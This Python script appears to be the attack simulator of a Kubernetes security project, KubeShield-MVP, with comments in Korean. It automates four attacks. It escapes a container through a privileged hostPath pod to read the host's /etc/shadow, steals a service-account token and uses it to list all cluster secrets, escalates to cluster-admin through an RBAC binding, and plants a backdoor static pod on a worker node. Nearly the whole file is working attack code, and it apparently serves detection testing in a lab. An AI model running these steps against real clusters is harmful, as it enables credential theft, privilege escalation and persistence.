#!/usr/bin/env python3
"""
KubeShield-MVP 공격 시뮬레이터
Kill Chain 4단계 공격을 자동으로 실행한다.
"""

import time
import json
import subprocess
import sys


def run_kubectl(args: list[str], capture=True) -> str:
    cmd = ["kubectl"] + args
    result = subprocess.run(cmd, capture_output=capture, text=True)
    if result.returncode != 0 and capture:
        print(f"  [ERROR] {' '.join(cmd)}")
        print(f"  stderr: {result.stderr.strip()}")
    return result.stdout.strip() if capture else ""


def wait_pod_ready(name: str, namespace: str, timeout: int = 120):
    print(f"  Pod '{name}' Ready 대기중...")
    run_kubectl([
        "wait", "--for=condition=Ready",
        f"pod/{name}", "-n", namespace,
        f"--timeout={timeout}s"
    ])


def s1_hostpath_escape():
    print("\n" + "=" * 60)
    print("[S1] Container Escape — hostPath 마운트 공격")
    print("=" * 60)

    print("  [1] privileged + hostPath Pod 생성")
    manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": "s1-attacker",
            "namespace": "attack-lab",
            "labels": {"attack": "s1-hostpath-escape"}
        },
        "spec": {
            "containers": [{
                "name": "attacker",
                "image": "ubuntu:22.04",
                "command": ["sleep", "infinity"],
                "securityContext": {"privileged": True},
                "volumeMounts": [{
                    "name": "host-root",
                    "mountPath": "/host"
                }]
            }],
            "volumes": [{
                "name": "host-root",
                "hostPath": {"path": "/", "type": "Directory"}
            }]
        }
    }
    subprocess.run(
        ["kubectl", "apply", "-f", "-"],
        input=json.dumps(manifest), text=True, capture_output=True
    )
    wait_pod_ready("s1-attacker", "attack-lab")

    print("  [2] 호스트 /etc/shadow 읽기 시도")
    result = run_kubectl([
        "exec", "-n", "attack-lab", "s1-attacker",
        "--", "cat", "/host/etc/shadow"
    ])
    if result:
        print(f"  [SUCCESS] 호스트 shadow 파일 접근 성공 ({len(result.splitlines())}줄)")
    else:
        print("  [FAIL] 접근 실패")

    return bool(result)


def s2_sa_token_theft():
    print("\n" + "=" * 60)
    print("[S2] Privilege Escalation — SA 토큰 탈취")
    print("=" * 60)

    print("  [1] overprivileged SA 사용 Pod 생성")
    manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": "s2-attacker",
            "namespace": "attack-lab",
            "labels": {"attack": "s2-sa-token-theft"}
        },
        "spec": {
            "serviceAccountName": "overprivileged-sa",
            "containers": [{
                "name": "attacker",
                "image": "curlimages/curl:8.7.1",
                "command": ["sleep", "infinity"]
            }]
        }
    }
    subprocess.run(
        ["kubectl", "apply", "-f", "-"],
        input=json.dumps(manifest), text=True, capture_output=True
    )
    wait_pod_ready("s2-attacker", "attack-lab")

    print("  [2] SA 토큰 파일 읽기")
    token = run_kubectl([
        "exec", "-n", "attack-lab", "s2-attacker",
        "--", "cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"
    ])
    if token:
        print(f"  [SUCCESS] 토큰 탈취 성공 (길이: {len(token)})")
    else:
        print("  [FAIL] 토큰 읽기 실패")
        return False

    print("  [3] 탈취한 토큰으로 클러스터 전체 Secret 조회")
    result = run_kubectl([
        "exec", "-n", "attack-lab", "s2-attacker",
        "--", "sh", "-c",
        'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && '
        'curl -sk -H "Authorization: Bearer $TOKEN" '
        'https://kubernetes.default.svc/api/v1/secrets'
    ])
    if '"SecretList"' in result:
        items = json.loads(result).get("items", [])
        print(f"  [SUCCESS] 클러스터 Secret {len(items)}개 조회 성공")
    else:
        print("  [FAIL] Secret 조회 실패")

    return True


def s3_rbac_escalation():
    print("\n" + "=" * 60)
    print("[S3] Privilege Escalation — RBAC 권한 상승 (bind verb)")
    print("=" * 60)

    print("  [1] bind 권한으로 cluster-admin ClusterRoleBinding 생성 시도")
    manifest = {
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "kind": "ClusterRoleBinding",
        "metadata": {"name": "s3-escalated-binding"},
        "subjects": [{
            "kind": "ServiceAccount",
            "name": "overprivileged-sa",
            "namespace": "attack-lab"
        }],
        "roleRef": {
            "kind": "ClusterRole",
            "name": "cluster-admin",
            "apiGroup": "rbac.authorization.k8s.io"
        }
    }
    result = subprocess.run(
        ["kubectl", "apply", "-f", "-"],
        input=json.dumps(manifest), text=True, capture_output=True
    )
    if result.returncode == 0:
        print("  [SUCCESS] cluster-admin 권한 바인딩 생성 성공")
    else:
        print(f"  [FAIL] {result.stderr.strip()}")
        return False

    print("  [2] 권한 상승 확인 — kube-system Secret 접근")
    check = run_kubectl([
        "auth", "can-i", "list", "secrets",
        "--namespace", "kube-system",
        "--as", "system:serviceaccount:attack-lab:overprivileged-sa"
    ])
    print(f"  kube-system Secret 접근 가능: {check}")

    return "yes" in check


def s4_static_pod_persistence():
    print("\n" + "=" * 60)
    print("[S4] Persistence — Static Pod manifest 삽입")
    print("=" * 60)

    print("  [1] 워커노드의 Static Pod 디렉토리에 악성 manifest 작성")
    worker_node = "kubeshield-worker"

    static_pod_manifest = """apiVersion: v1
kind: Pod
metadata:
  name: backdoor-pod
  namespace: default
spec:
  containers:
  - name: backdoor
    image: ubuntu:22.04
    command: ["sleep", "infinity"]
"""
    result = subprocess.run(
        ["docker", "exec", worker_node, "bash", "-c",
         f'echo \'{static_pod_manifest}\' > /etc/kubernetes/manifests/backdoor.yaml'],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        print("  [SUCCESS] Static Pod manifest 작성 완료")
    else:
        print(f"  [FAIL] {result.stderr.strip()}")
        return False

    print("  [2] Static Pod 생성 확인 (10초 대기)")
    time.sleep(10)
    pods = run_kubectl(["get", "pods", "-n", "default", "--field-selector",
                        f"spec.nodeName={worker_node}"])
    if "backdoor" in pods:
        print(f"  [SUCCESS] Static Pod 'backdoor-pod' 자동 생성 확인")
    else:
        print("  [PENDING] Static Pod 아직 생성 안됨 (kubelet 반영 대기중)")

    return True


def cleanup():
    print("\n" + "=" * 60)
    print("[CLEANUP] 공격 리소스 정리")
    print("=" * 60)

    run_kubectl(["delete", "pod", "s1-attacker", "-n", "attack-lab",
                 "--ignore-not-found", "--grace-period=0", "--force"])
    run_kubectl(["delete", "pod", "s2-attacker", "-n", "attack-lab",
                 "--ignore-not-found", "--grace-period=0", "--force"])
    run_kubectl(["delete", "clusterrolebinding", "s3-escalated-binding",
                 "--ignore-not-found"])
    subprocess.run(
        ["docker", "exec", "kubeshield-worker", "rm", "-f",
         "/etc/kubernetes/manifests/backdoor.yaml"],
        capture_output=True
    )
    run_kubectl(["delete", "pod", "backdoor-pod-kubeshield-worker", "-n", "default",
                 "--ignore-not-found", "--grace-period=0", "--force"])
    print("  정리 완료")


def main():
    print("=" * 60)
    print("  KubeShield-MVP 공격 시뮬레이터")
    print("  Kill Chain: Escape → Escalation → Persistence")
    print("=" * 60)

    if "--cleanup" in sys.argv:
        cleanup()
        return

    results = {}
    results["S1"] = s1_hostpath_escape()
    results["S2"] = s2_sa_token_theft()
    results["S3"] = s3_rbac_escalation()
    results["S4"] = s4_static_pod_persistence()

    print("\n" + "=" * 60)
    print("  공격 결과 요약")
    print("=" * 60)
    for name, success in results.items():
        status = "SUCCESS" if success else "FAIL"
        print(f"  {name}: [{status}]")
    print("=" * 60)

    if "--cleanup-after" in sys.argv:
        cleanup()


if __name__ == "__main__":
    main()
